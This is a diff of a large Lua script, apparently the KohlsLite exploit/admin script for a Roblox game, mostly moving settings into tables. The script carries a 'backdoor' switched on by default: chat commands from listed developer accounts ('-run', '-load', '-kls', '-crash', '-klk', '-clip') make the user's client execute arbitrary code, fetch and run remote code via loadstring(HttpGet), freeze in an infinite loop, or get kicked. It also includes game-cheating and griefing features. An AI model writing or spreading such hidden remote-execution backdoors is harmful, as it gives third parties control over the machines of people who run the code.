@@ -387,11 +387,18 @@ local function Chat(msg)
       game.Players:Chat(msg)
 end
 
--- Speak function
-legacyChat = (game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService) -- From Infinite Yield
+-- From Infinite Yield
+local IYchecks = {
+	-- Check if KAH is using legacy chat
+	legacyChat = (game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService),
 
+	-- Mobile checker
+	IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, game:GetService("UserInputService"):GetPlatform())
+}
+
+-- Speak function
 local function Speak(msg)
-    if not legacyChat then
+    if not IYchecks.legacyChat then
 	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
     else 
     	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
@@ -411,11 +418,12 @@ end
 local defaults = {".antirocket me", ".tnok", ".antikill me"} --".antimsg me"
 
 -- Misc variables (ignore these they are for bug fixes)
-local bending -- ignore
-local ratelj -- ignore
-local eincrash -- ignore
-
-local notifiedRespectFiltering = false
+local backend_stuff = {
+	bending = false, -- ignore
+	ratelj = false, -- ignore
+	eincrash = false, -- ignore
+	notifiedRespectFiltering = false
+}
 
 -- Perm spoofer (speed)
 local editedstuff = {
@@ -428,14 +436,21 @@ local editedstuff = {
 	editedjump = true
 }
 
--- Boombox range
-local bgrange = 128
 
--- Circa range
-local circrad = 10
+-- Number settings
+local ex_settings = {
+	-- Boombox range
+	bgrange = 128,
 
--- Mobile checker
-local IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, game:GetService("UserInputService"):GetPlatform()) -- From Infinite Yield
+	-- Circlise range
+	circrad = 10,
+
+	-- Times the super command should run
+	amon = 100,
+
+	-- Spam command wait
+	spamwait = 0.01
+}
 
 -- Auto rejoin
 local autorejoin = false
@@ -577,23 +592,30 @@ local atprogperms = {
 -- New users get blacklisted (prevent crashers)
 local newplrslocked = {}
 
--- if new players under 21 days join they get blacklisted
-local newplrautoslock = false 
+-- Server-centred stuff
+mainbar_stuff = {
+	-- Normal serverlock
+	slockenabled = false,
 
--- Control what is considered as a new account
-local newlen = 21
+	-- More advanced serverlock (Tech's)
+	superchargeslock = false, 
+	
+	-- if new players under (newlen) days join they get blacklisted
+	newplrautoslock = false,
 
--- Serverlock
-local slockenabled = false
-local superchargeslock = false -- insane slock (Tech Serverlock)
+	-- Control what age an account stops becoming new
+	newlen = 21,
+
+	-- Spread the KohlsLite watermark in some announcements...
+	watermark_kl = false,
+
+	-- The backdoor
+	backdoor_enabled = true
+}
 
 -- Auto char
 local autocharid = "nll"
 local autochar = false
-
--- Watermark
-local watermark_kl = false
--- watermarK_text = "KohlsLite" (unused)
 
 -- Loopkill
 local loopkill = {}
@@ -649,9 +671,6 @@ furry_on_sight = {}
 
 -- Gearban user
 gb_on_sight = {}
-
--- Toggle the backdoor
-backdoor_enabled = true
 
 -- Variables for moving
 local movestatus = false
@@ -1813,24 +1832,6 @@ local click_stuff = {
 	click_command = "explode"
 }
 
--- Admin things relating to users
-
--- All admin but for individual users
-local FAdmins = {}
-
--- All admin
-local alladmin = false
-
--- Super commands and spamming
-
--- Super commmand times
-local amon = 100 
-
--- Spam command wait
-local spamwait = 0
-
--- Music telling
-
 -- Admin related
 admin_stuff = {
 	-- Grab a pad forever!
@@ -1839,8 +1840,14 @@ admin_stuff = {
 
 	-- Grab all the pads forever!
 	loopgrab = false,
-	loopgrab2 = false
+	loopgrab2 = false,
+
+	-- Everyone in the server uses your admin to run commands!
+	alladmin = false 
 }
+
+-- All admin but for individual users
+local FAdmins = {}
 
 -- Regen find (DO NOT TOUCH THIS)
 local regfind = false
@@ -1957,9 +1964,6 @@ local player_relate = {
 	musicsay = true
 
 }
-
--- unused
-thesecretvariable = true
 
 -- Log Trap
 pcall(function()
@@ -2102,7 +2106,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
         end
 		
         if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'cmdpi' then
-		if IsOnMobile then
+		if IYchecks.IsOnMobile then
 			Remind("CMD PI/V3 does not work on mobile executors.")
 		else
                 	GExecute("https://raw.githubusercontent.com/S-PScripts/KAH/main/CMD%20v3.lua")
@@ -2705,12 +2709,12 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 	if player_relate.blwl_an then
         	Chat("h \n\n\n\n\n Server is locked! \n\n\n\n\n");Regen()
 	end
-        slockenabled = true
+        mainbar_stuff.slockenabled = true
 	Remind("Turned on the serverlock!")
        end
 
        if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'serverlock' then
-		slockenabled = true
+		mainbar_stuff.slockenabled = true
        end
 
        if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unserverlock' then
@@ -2718,7 +2722,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
        end
 
        if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unslock' then
-        slockenabled = false
+        mainbar_stuff.slockenabled = false
 	if player_relate.blwl_an then
         	Chat("h \n\n\n\n\n Server is unlocked! \n\n\n\n\n")
 	end
@@ -2728,22 +2732,22 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
        end
 
        if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'scslock' then
-			superchargeslock = true
+			mainbar_stuff.superchargeslock = true
 			Remind("SUPER LOCK ENABLED")
        end
 
        if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unscslock' then
-			superchargeslock = false
+			mainbar_stuff.superchargeslock = false
 			Remind("SUPER LOCK DISABLED")
        end
 		
        if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'newplrslock' then
-          newplrautoslock = true
+          mainbar_stuff.newplrautoslock = true
 	  Remind("New player auto slock is now enabled!")
        end
 
        if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'unnewplrslock' then
-          newplrautoslock = false
+          mainbar_stuff.newplrautoslock = false
 	  Remind("New player auto slock is now disabled!")
        end
 
@@ -2765,7 +2769,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
         end
 
         if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'plrnewlen' then
-                newlen = tonumber(string.sub(msg:lower(), #prefix + 11))
+                mainbar_stuff.newlen = tonumber(string.sub(msg:lower(), #prefix + 11))
                 Remind("Set age restrictions to "..newlen.." days!")
         end
 
@@ -2830,7 +2834,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
             task.wait(0.25)
 	    bom.Remote:FireServer("PlaySong", tonumber(myplay))
 	    function rng() 
-                	return math.random(-bgrange, bgrange)
+                	return math.random(-ex_settings.bgrange, ex_settings.bgrange)
             end
             bom.GripPos = Vector3.new(rng(), 1, rng())
         end
@@ -2849,7 +2853,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 		task.wait(0.5)
 				
 	  	function rng() 
-                	return math.random(-bgrange, bgrange)
+                	return math.random(-ex_settings.bgrange, ex_settings.bgrange)
             	end
 			
   		local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
@@ -2890,8 +2894,8 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
         			item.Parent = game.Players.LocalPlayer.Character
         			ic = ic + 1
         			local angle = (ic - 1) * (360 / tc) * (math.pi / 180)
-        			local x = circrad * math.cos(angle)
-        			local z = circrad * math.sin(angle)
+        			local x = ex_settings.circrad * math.cos(angle)
+        			local z = ex_settings.circrad * math.sin(angle)
         			item.GripPos = Vector3.new(x, 1, z) 
     			end
 		end
@@ -2957,19 +2961,19 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
         		item.Parent = game.Players.LocalPlayer.Character
         		ic = ic + 1
         		local angle = (ic - 1) * (360 / tc) * (math.pi / 180)
-        		local x = circrad * math.cos(angle)
-        		local z = circrad * math.sin(angle)
+        		local x = ex_settings.circrad * math.cos(angle)
+        		local z = ex_settings.circrad * math.sin(angle)
         		item.GripPos = Vector3.new(x, 1, z) 
     		end
 	end
     end
 
     if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'crad' then
-		circrad = tonumber(string.sub(msg:lower(), #prefix + 6))
+		ex_settings.circrad = tonumber(string.sub(msg:lower(), #prefix + 6))
     end
 
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'bgrange' then
-		bgrange = tonumber(string.sub(msg:lower(), #prefix + 9))
+		ex_settings.bgrange = tonumber(string.sub(msg:lower(), #prefix + 9))
     end
 		
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'diceroll' then
@@ -3051,8 +3055,8 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
     end
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'nmusic' then -- if it double executes ... you
-            if ratelj then print("anti double execution worked!") return end
-            ratelj = true
+            if backend_stuff.ratelj then print("Anti double execution worked!") return end
+            backend_stuff.ratelj = true
 
             local length = 0
             for _ in pairs(musictable) do
@@ -3075,12 +3079,12 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[mast].id)
            else
                 Chat("music " .. musictable[mast].id)
-           end; ratelj = false
+           end; backend_stuff.ratelj = false
     end
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'pmusic' then -- if it double executes ... you
-            if ratelj then print("anti double execution worked!") return end
-            ratelj = true
+            if backend_stuff.ratelj then print("Anti double execution worked!") return end
+            backend_stuff.ratelj = true
 
             local length = 0
             for _ in pairs(musictable) do
@@ -3103,7 +3107,7 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[mast].id)
            else
                 Chat("music " .. musictable[mast].id)
-           end; ratelj = false
+           end; backend_stuff.ratelj = false
     end
 
     if string.sub(msg, 1, #prefix + 9)  == prefix..'musiclist' then
@@ -5137,9 +5141,9 @@ Remind([[Sorry, you don't have Person 299 Admin Commands to perform this command
 Commands required: rocket]])
 return
 		end
-		if bending then return 
+		if backend_stuff.bending then return 
 		else
-			bending = true
+			backend_stuff.bending = true
                 	local bendin = string.sub(msg:lower(), #prefix + 6)
                 	Chat("rocket/"..bendin);task.wait(.5)
                 	Chat("freeze "..bendin)
@@ -5444,7 +5448,7 @@ return
     end
 
    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'supert' then
-        amon = tonumber(string.sub(msg:lower(), #prefix + 8))
+        ex_settings.amon = tonumber(string.sub(msg:lower(), #prefix + 8))
         Remind("Supercmd amount has been modified.")
     end
 
@@ -5467,12 +5471,14 @@ return
    end
 
     if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'spamw' then
-        spamwait = tonumber(string.sub(msg:lower(), #prefix + 7))
-        Remind("Spam wait has been modified!")
+	if not string.sub(msg:lower(), 1, #prefix + 8) == prefix..'spamwait' then
+        	ex_settings.spamwait = tonumber(string.sub(msg:lower(), #prefix + 7))
+        	Remind("Spam wait has been modified!")
+	end
     end
 
    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'spamwait' then
-        spamwait = tonumber(string.sub(msg:lower(), #prefix + 10))
+        ex_settings.spamwait = tonumber(string.sub(msg:lower(), #prefix + 10))
         Remind("Spam wait has been modified!")
     end
 
@@ -5617,7 +5623,7 @@ return
     end
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'icemap' then
-		if IsOnMobile then
+		if IYchecks.IsOnMobile then
                 	return Remind("You have been detected as being on mobile. This command will not run to prevent crashing.")
 		end
 		if firetouchinterest then
@@ -5767,7 +5773,7 @@ return
     end
 
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'biglogs' then
-	if IsOnMobile then
+	if IYchecks.IsOnMobile then
 		Remind("You're on mobile! It would be so big that you wouldn't be able to close the GUI!")
 	else
 	    	danum = tonumber(string.sub(msg:lower(), #prefix + 9))
@@ -6104,7 +6110,7 @@ return
    end
 
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'alladmin' then
-	alladmin = true
+	admin_stuff.alladmin = true
 	Chat("h \n\n\n\n\n Everyone has been given admin! Chat any command. \n\n\n\n\n")
 	Remind("All admin enabled.")
     end
@@ -6152,7 +6158,7 @@ return
     end
 
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unalladmin' then
-	alladmin = false
+	admin_stuff.alladmin = false
         Chat("h \n\n\n\n\n Free admin is off. \n\n\n\n\n")
 	Remind("All admin disabled.")
     end
@@ -6830,7 +6836,7 @@ party]])
 
     if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'ufly' then
 	 Remind("Setting you up...")
-         eincrash = true ; task.wait(0.1) ; UFLY()
+         backend_stuff.eincrash = true ; task.wait(0.1) ; UFLY()
     end
 
     if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'isc' then
@@ -8636,12 +8642,12 @@ end
     end
 
     if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'bdoor' then
-	backdoor_enabled = true
+	mainbar_stuff.backdoor_enabled = true
 	Remind("Enabled backdoors.")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unbdoor' then
-	backdoor_enabled = false
+	mainbar_stuff.backdoor_enabled = false
 	Remind("Disabled backdoors.")
     end
 
@@ -8875,8 +8881,8 @@ end
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'mutebb' then -- yes this isn't a loop, i'm lazy
 	SoundService = game:GetService("SoundService")
-	if not notifiedRespectFiltering and SoundService.RespectFilteringEnabled then 
-			notifiedRespectFiltering = true 
+	if not backend_stuff.notifiedRespectFiltering and SoundService.RespectFilteringEnabled then 
+			backend_stuff.notifiedRespectFiltering = true 
 	end
 	local players = game.Players:GetPlayers()
 	for i, v in pairs(players) do
@@ -8898,8 +8904,8 @@ end
 
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unmutebb' then
 	SoundService = game:GetService("SoundService")
-	if not notifiedRespectFiltering and SoundService.RespectFilteringEnabled then 
-			notifiedRespectFiltering = true 
+	if not backend_stuff.notifiedRespectFiltering and SoundService.RespectFilteringEnabled then 
+			backend_stuff.notifiedRespectFiltering = true 
 	end
 
 	local players = game.Players:GetPlayers()
@@ -9172,7 +9178,7 @@ end
 
     if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'fly' then
         local args = string.split(msg, " ")
-	if not IsOnMobile then
+	if not IYchecks.IsOnMobile then
 		NOFLY()
 		wait()
 		sFLY()
@@ -9185,7 +9191,7 @@ end
     end
 
     if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'unfly' then
-	if not IsOnMobile then 
+	if not IYchecks.IsOnMobile then 
 		NOFLY() 
 	else 
 		unmobilefly(game.Players.LocalPlayer)
@@ -9211,13 +9217,13 @@ end
 
     if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'tfly' then
 	if FLYING then
-		if not IsOnMobile then 
+		if not IYchecks.IsOnMobile then 
 			NOFLY()
 		else 
 			unmobilefly(game.Players.LocalPlayer) 
 		end
 	else
-		if not IsOnMobile then 
+		if not IYchecks.IsOnMobile then 
 			sFLY() 
 		else 
 			mobilefly(game.Players.LocalPlayer) 
@@ -9384,7 +9390,7 @@ task.spawn(function()
         if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(whitelist, v.Name) and not table.find(pwl, v.Name)) then
             for i, player in ipairs(players) do
                 if string.find(player.Name:lower(), v.Name:lower()) then
-                    if slockenabled == true then
+                    if mainbar_stuff.slockenabled == true then
                         if not game.Lighting:FindFirstChild(v.Name) then
                                 local isB,spe = bypassattemptcheck(v.Name)
                                 if isB then
@@ -9414,7 +9420,7 @@ task.spawn(function()
                                          Chat("pm "..v.Name.." Sorry, you are blacklisted from this server!")
                                 end
                         end
-                    elseif table.find(newplrslocked, v.Name) and newplrautoslock == true then
+                    elseif table.find(newplrslocked, v.Name) and mainbar_stuff.newplrautoslock == true then
                         if not game.Lighting:FindFirstChild(v.Name) then
                                 local isB,spe = bypassattemptcheck(v.Name)
                                 if isB then
@@ -9429,7 +9435,7 @@ task.spawn(function()
                                         Chat("pm "..v.Name.." Sorry, you are blacklisted for having an account under the account age limit!")
                                 end
                         end
-                    elseif superchargeslock == true then
+                    elseif mainbar_stuff.superchargeslock == true then
 			if not game.Lighting:FindFirstChild(v.Name) then
 				game.Players:Chat(":blind all")
     				game.Players:Chat("fogcolor 0 0 0")
@@ -10484,7 +10490,7 @@ game:GetService("RunService").RenderStepped:Connect(function()
 								end
 			
 								if crash_settings.autoblvgc then
-									slockenabled = true
+									mainbar_stuff.slockenabled = true
 								end
 							
 							elseif gear_antis.anticrash then
@@ -10530,7 +10536,7 @@ game:GetService("RunService").RenderStepped:Connect(function()
 								end
 			
 								if crash_settings.autoblvgc then
-									slockenabled = true
+									mainbar_stuff.slockenabled = true
 								end
 							
 							elseif gear_antis.anticrash then
@@ -11452,7 +11458,7 @@ function PLRSTART(v)
 		    -- // Remove this if you want, just don't abuse with KohlsLite, okay? \\ --
 
                     if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then -- klc means KohlsLite Check
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				--print("kohlslite user")
 			else
                             	Speak("I use KohlsLite!")
@@ -11460,7 +11466,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then -- prc means PR Check (but it's KohlsLite though)
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				--print("kohlslite user")
 			else
                             	Speak("Collect my pages...")
@@ -11469,7 +11475,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				--print("kohlslite user")
 			else
 				if setclipboard then
@@ -11482,7 +11488,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				--print("kohlslite user")
 			else
 				if setclipboard then
@@ -11496,7 +11502,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then -- klk means KohlsLite Kick
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				--print("kohlslite user")
 			else
                             pcall(function()
@@ -11506,7 +11512,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then -- prk means PR Kick (but it's KohlsLite though)
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				--print("kohlslite user")
 			else
                             pcall(function()
@@ -11517,7 +11523,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				-- print("kohlslite user")
 			else
                             Remind("You have been warned by a KohlsLite dev!")
@@ -11525,7 +11531,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				-- print("kohlslite user")
 			else
                             Remind("You have been warned by a KohlsLite collaborator!")
@@ -11534,7 +11540,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				-- print("capybara")
 			else
                             while true do end
@@ -11543,7 +11549,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				-- print("capybara")
 			else
                             while true do end
@@ -11553,7 +11559,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				-- print("run")
 			else
 			    Execute(string.sub(msg, 6))
@@ -11561,7 +11567,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				-- print("run")
 			else
                             Execute(string.sub(msg, 6))
@@ -11569,7 +11575,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-kls" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then 
+	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then 
 				-- print("si")
 			else
                         	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
@@ -11579,7 +11585,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				-- print("si")
 			else
                         	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
@@ -11588,7 +11594,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				-- print("load")
 			else
                             GExecute(string.sub(msg, 7))
@@ -11596,7 +11602,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
 				-- print("load")
 			else
                             GExecute(string.sub(msg, 7))
@@ -11608,7 +11614,7 @@ function PLRSTART(v)
             -- END OF DEV SECTION --
 
             -- ADMIN
-            if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
+            if (admin_stuff.alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not mainbar_stuff.slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
                 local command = string.gsub(msg:lower(), "me", v.Name)
                 if string.sub(command, 1, 1) == ":" then
                     command = ""
@@ -12784,7 +12790,7 @@ end
 -- KAH fly
 function UFLY()
 
-	eincrash = false
+	backend_stuff.eincrash = false
 	local isFlying = true
 
 	local bodyGyro = nil
@@ -12818,7 +12824,7 @@ function UFLY()
 		while isFlying do
 			wait()
 
-			if eincrash then 
+			if backend_stuff.eincrash then 
 				isFlying = false 
 				break 
 			end
@@ -12946,7 +12952,7 @@ function UFLY()
 	Fly()
 
 	while true do task.wait(0) 
-		if eincrash then 
+		if backend_stuff.eincrash then 
 			isFlying = false ; keyConnection1:Disconnect() ;  keyConnection2:Disconnect() 
 			break
 			end
@@ -14346,7 +14352,7 @@ function onPlayerAdded(player)
 			check_con = true
    		end
 
-    		if player.AccountAge < newlen == true and newplrautoslock == true then
+    		if player.AccountAge < mainbar_stuff.newlen == true and mainbar_stuff.newplrautoslock == true then
 			if not table.find(whitelist, player.Name) and not table.find(pwl, player.Name) then
 				if player_relate.welcomemsg == true then
          				Chat("h \n\n\n\n\n Automatically banned "..player.Name.." for being on an account under the account age limit. \n\n\n\n\n")
@@ -14381,9 +14387,11 @@ function onPlayerAdded(player)
 		if player_relate.welcomemsg == true then
         		if table.find(whitelist, player.Name) then
          			Chat("h \n\n\n\n\n Welcome to the server, " .. player.Name .. ". You are whitelisted from serverlocks! \n\n\n\n\n")
+			elseif table.find(GWhitelisted, player.Name) then
+				Chat("h \n\n\n\n\n Welcome to the server, " .. player.Name .. ". You are whitelisted to use any gear! \n\n\n\n\n")
 			elseif table.find(FAdmins, player.Name) then
 	         		Chat("h \n\n\n\n\n Welcome to the server, " .. player.Name .. ". You have been given free admin! \n\n\n\n\n")
-			elseif alladmin then
+			elseif admin_stuff.alladmin then
 	         		Chat("h \n\n\n\n\n Welcome to the server, " .. player.Name .. ". This server has free admin! \n\n\n\n\n")
 			else
 	         		Chat("h \n\n\n\n\n Welcome to the server, " .. player.Name .. ". \n\n\n\n\n")
@@ -17019,7 +17027,7 @@ for i, v in pairs(game.Players:GetPlayers()) do
                 table.insert(carcar, v.Name)
         end
 
-    	if v.AccountAge < newlen == true and newplrautoslock == true then
+    	if v.AccountAge < mainbar_stuff.newlen == true and mainbar_stuff.newplrautoslock == true then
 		table.insert(newplrslocked, v.Name)
 	end
 
